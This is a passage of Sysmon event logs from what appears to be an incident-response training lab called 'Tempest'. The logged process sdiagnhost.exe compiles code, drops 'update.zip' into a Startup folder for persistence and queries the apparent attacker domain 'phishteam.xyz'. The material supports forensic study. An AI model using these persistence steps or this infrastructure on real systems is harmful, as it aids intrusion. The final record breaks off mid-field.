140,7645,2022-06-20 17:13:36.8031198,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 2628, ProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",RuleName: -,Image: C:\Windows\SysWOW64\sdiagnhost.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\c2pj33d5.cmdline,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:36.791""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2628""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\c2pj33d5.cmdline""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:36.791""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
141,7646,2022-06-20 17:13:36.8069775,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 728, ProcessGUID: 4bbef3ae-aac0-62b0-3a0a-000000000700",RuleName: -,"MD5=F8F36858B9405FBE27377FD7E8FEC2F2,SHA256=086C38FD66AEC0E824ECB74ECE3D7124174201A9B4F5C9974FCFDBAF04A5870E,IMPHASH=950FB6F62526333E663D35BA72D19DDC",ParentProcess: C:\Windows\SysWOW64\sdiagnhost.exe,"ParentProcessID: 2628, ParentProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",ParentCommandLine: C:\Windows\SysWOW64\sdiagnhost.exe -Embedding,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\benimaru\AppData\Local\Temp\c2pj33d5.cmdline""",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:36.805""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aac0-62b0-3a0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""728""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe""},{""@Name"":""FileVersion"",""#text"":""4.8.3761.0 built by: NET48REL1""},{""@Name"":""Description"",""#text"":""Visual C# Command Line Compiler""},{""@Name"":""Product"",""#text"":""Microsoft® .NET Framework""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""csc.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\benimaru\\AppData\\Local\\Temp\\c2pj33d5.cmdline\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-aa76-62b0-cd6b-a40100000000""},{""@Name"":""LogonId"",""#text"":""0x1A46BCD""},{""@Name"":""TerminalSessionId"",""#text"":""10""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=F8F36858B9405FBE27377FD7E8FEC2F2,SHA256=086C38FD66AEC0E824ECB74ECE3D7124174201A9B4F5C9974FCFDBAF04A5870E,IMPHASH=950FB6F62526333E663D35BA72D19DDC""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""2628""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe -Embedding""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
142,7647,2022-06-20 17:13:36.9268910,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 988, ProcessGUID: 4bbef3ae-aac0-62b0-3b0a-000000000700",RuleName: -,"MD5=70D838A7DC5B359C3F938A71FAD77DB0,SHA256=E4DBDBF7888EA96F3F8AA5C4C7F2BCF6E57D724DD8194FE5F35B673C6EF724EA,IMPHASH=0FCE7AAB563778C495FB59AA62464473",ParentProcess: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe,"ParentProcessID: 728, ParentProcessGUID: 4bbef3ae-aac0-62b0-3a0a-000000000700","ParentCommandLine: ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\benimaru\AppData\Local\Temp\c2pj33d5.cmdline""","C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\benimaru\AppData\Local\Temp\RES56B7.tmp"" ""c:\Users\benimaru\AppData\Local\Temp\CSC61C0590C9D80463BBEB313FF84AE73D.TMP""",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:36.925""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aac0-62b0-3b0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""988""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe""},{""@Name"":""FileVersion"",""#text"":""14.10.25028.0 built by: VCTOOLSD15RTM""},{""@Name"":""Description"",""#text"":""Microsoft® Resource File To COFF Object Conversion Utility""},{""@Name"":""Product"",""#text"":""Microsoft® .NET Framework""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""CVTRES.EXE""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \""/OUT:C:\\Users\\benimaru\\AppData\\Local\\Temp\\RES56B7.tmp\"" \""c:\\Users\\benimaru\\AppData\\Local\\Temp\\CSC61C0590C9D80463BBEB313FF84AE73D.TMP\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-aa76-62b0-cd6b-a40100000000""},{""@Name"":""LogonId"",""#text"":""0x1A46BCD""},{""@Name"":""TerminalSessionId"",""#text"":""10""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=70D838A7DC5B359C3F938A71FAD77DB0,SHA256=E4DBDBF7888EA96F3F8AA5C4C7F2BCF6E57D724DD8194FE5F35B673C6EF724EA,IMPHASH=0FCE7AAB563778C495FB59AA62464473""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-aac0-62b0-3a0a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""728""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\benimaru\\AppData\\Local\\Temp\\c2pj33d5.cmdline\""""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
143,7648,2022-06-20 17:13:36.9588054,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 728, ProcessGUID: 4bbef3ae-aac0-62b0-3a0a-000000000700",RuleName: DLL,Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\c2pj33d5.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:36.947""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aac0-62b0-3a0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""728""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\c2pj33d5.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:36.791""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
144,7649,2022-06-20 17:13:36.9650778,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,2,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700",RuleName: -,Image: C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE,QueryName: augloop.office.com,QueryStatus: 0,QueryResults: type:  5 augloop-prod.trafficmanager.net;type:  5 augloop-prod-pa00.southeastasia.cloudapp.azure.com;2603:1046:1406:1::3;::ffff:52.111.240.14;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:34.615""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aaa8-62b0-2e0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""496""},{""@Name"":""QueryName"",""#text"":""augloop.office.com""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""type:  5 augloop-prod.trafficmanager.net;type:  5 augloop-prod-pa00.southeastasia.cloudapp.azure.com;2603:1046:1406:1::3;::ffff:52.111.240.14;""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
145,7650,2022-06-20 17:13:36.9742768,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 2628, ProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",RuleName: DLL,Image: C:\Windows\SysWOW64\sdiagnhost.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\j50cydjq.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:36.962""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2628""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\j50cydjq.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:36.962""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
146,7651,2022-06-20 17:13:36.9746407,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 2628, ProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",RuleName: -,Image: C:\Windows\SysWOW64\sdiagnhost.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\j50cydjq.cmdline,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:36.962""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2628""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\j50cydjq.cmdline""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:36.962""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
147,7652,2022-06-20 17:13:36.9769911,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 5780, ProcessGUID: 4bbef3ae-aac0-62b0-3c0a-000000000700",RuleName: -,"MD5=F8F36858B9405FBE27377FD7E8FEC2F2,SHA256=086C38FD66AEC0E824ECB74ECE3D7124174201A9B4F5C9974FCFDBAF04A5870E,IMPHASH=950FB6F62526333E663D35BA72D19DDC",ParentProcess: C:\Windows\SysWOW64\sdiagnhost.exe,"ParentProcessID: 2628, ParentProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",ParentCommandLine: C:\Windows\SysWOW64\sdiagnhost.exe -Embedding,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\benimaru\AppData\Local\Temp\j50cydjq.cmdline""",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:36.975""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aac0-62b0-3c0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""5780""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe""},{""@Name"":""FileVersion"",""#text"":""4.8.3761.0 built by: NET48REL1""},{""@Name"":""Description"",""#text"":""Visual C# Command Line Compiler""},{""@Name"":""Product"",""#text"":""Microsoft® .NET Framework""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""csc.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\benimaru\\AppData\\Local\\Temp\\j50cydjq.cmdline\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-aa76-62b0-cd6b-a40100000000""},{""@Name"":""LogonId"",""#text"":""0x1A46BCD""},{""@Name"":""TerminalSessionId"",""#text"":""10""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=F8F36858B9405FBE27377FD7E8FEC2F2,SHA256=086C38FD66AEC0E824ECB74ECE3D7124174201A9B4F5C9974FCFDBAF04A5870E,IMPHASH=950FB6F62526333E663D35BA72D19DDC""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""2628""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe -Embedding""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
148,7653,2022-06-20 17:13:37.0716627,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 8616, ProcessGUID: 4bbef3ae-aac1-62b0-3d0a-000000000700",RuleName: -,"MD5=70D838A7DC5B359C3F938A71FAD77DB0,SHA256=E4DBDBF7888EA96F3F8AA5C4C7F2BCF6E57D724DD8194FE5F35B673C6EF724EA,IMPHASH=0FCE7AAB563778C495FB59AA62464473",ParentProcess: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe,"ParentProcessID: 5780, ParentProcessGUID: 4bbef3ae-aac0-62b0-3c0a-000000000700","ParentCommandLine: ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\benimaru\AppData\Local\Temp\j50cydjq.cmdline""","C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\benimaru\AppData\Local\Temp\RES5754.tmp"" ""c:\Users\benimaru\AppData\Local\Temp\CSC3F6B364B29A74481A24B84459BFEA8B6.TMP""",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:37.070""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aac1-62b0-3d0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""8616""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe""},{""@Name"":""FileVersion"",""#text"":""14.10.25028.0 built by: VCTOOLSD15RTM""},{""@Name"":""Description"",""#text"":""Microsoft® Resource File To COFF Object Conversion Utility""},{""@Name"":""Product"",""#text"":""Microsoft® .NET Framework""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""CVTRES.EXE""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 \""/OUT:C:\\Users\\benimaru\\AppData\\Local\\Temp\\RES5754.tmp\"" \""c:\\Users\\benimaru\\AppData\\Local\\Temp\\CSC3F6B364B29A74481A24B84459BFEA8B6.TMP\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-aa76-62b0-cd6b-a40100000000""},{""@Name"":""LogonId"",""#text"":""0x1A46BCD""},{""@Name"":""TerminalSessionId"",""#text"":""10""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=70D838A7DC5B359C3F938A71FAD77DB0,SHA256=E4DBDBF7888EA96F3F8AA5C4C7F2BCF6E57D724DD8194FE5F35B673C6EF724EA,IMPHASH=0FCE7AAB563778C495FB59AA62464473""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-aac0-62b0-3c0a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""5780""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe\"" /noconfig /fullpaths @\""C:\\Users\\benimaru\\AppData\\Local\\Temp\\j50cydjq.cmdline\""""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
149,7654,2022-06-20 17:13:37.0949299,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 5780, ProcessGUID: 4bbef3ae-aac0-62b0-3c0a-000000000700",RuleName: DLL,Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\j50cydjq.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:37.087""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aac0-62b0-3c0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""5780""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\j50cydjq.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:36.962""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
150,7655,2022-06-20 17:13:37.5888839,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,2,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700",RuleName: -,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 52.111.240.14,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:34.663""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aaa8-62b0-2e0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""496""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51834""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""52.111.240.14""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""443""},{""@Name"":""DestinationPortName"",""#text"":""https""}]}}"
151,7656,2022-06-20 17:13:37.8370993,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 2628, ProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",RuleName: T1023,Image: C:\Windows\SysWOW64\sdiagnhost.exe,TargetFilename: C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.zip,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1023""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:37.822""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2628""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.zip""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:37.822""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
152,7657,2022-06-20 17:13:38.7446758,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 2628, ProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",RuleName: -,Image: C:\Windows\SysWOW64\sdiagnhost.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\__PSScriptPolicyTest_fnrohaia.xvz.ps1,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:38.728""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2628""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\__PSScriptPolicyTest_fnrohaia.xvz.ps1""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:38.728""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
153,7658,2022-06-20 17:13:38.8276661,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,RegistryEvent (Value Set),TEMPEST\benimaru,,"ProcessID: 8572, ProcessGUID: 4bbef3ae-aa78-62b0-f309-000000000700",RuleName: -,Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-349058839-1848105669-1528301110-1001\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{E88DCCE0-B7B3-11D1-A9F0-00AA0060FA31} {000214E6-0000-0000-C000-000000000046} 0xFFFF,Details: Binary Data,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:38.821""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aa78-62b0-f309-000000000700""},{""@Name"":""ProcessId"",""#text"":""8572""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-349058839-1848105669-1528301110-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Cached\\{E88DCCE0-B7B3-11D1-A9F0-00AA0060FA31} {000214E6-0000-0000-C000-000000000046} 0xFFFF""},{""@Name"":""Details"",""#text"":""Binary Data""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
154,7659,2022-06-20 17:13:38.9836407,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,2,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 2628, ProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",RuleName: -,Image: C:\Windows\SysWOW64\sdiagnhost.exe,QueryName: phishteam.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:c7bf;::ffff:167.71.199.191;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:36.220""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2628""},{""@Name"":""QueryName"",""#text"":""phishteam.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:c7bf;::ffff:167.71.199.191;""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
155,7660,2022-06-20 17:13:39.9866425,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,2,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 4616, ProcessGUID: 4bbef3ae-aa86-62b0-140a-000000000700",RuleName: -,Image: C:\Program Files\Google\Chrome\Application\chrome.exe,QueryName: wpad,QueryStatus: 123,QueryResults: -,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:37.488""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aa86-62b0-140a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4616""},{""@Name"":""QueryName"",""#text"":""wpad""},{""@Name"":""QueryStatus"",""#text"":""123""},{""@Name"":""QueryResults"",""#text"":""-""},{""@Name"":""Image"",""#text"":""C:\\Program 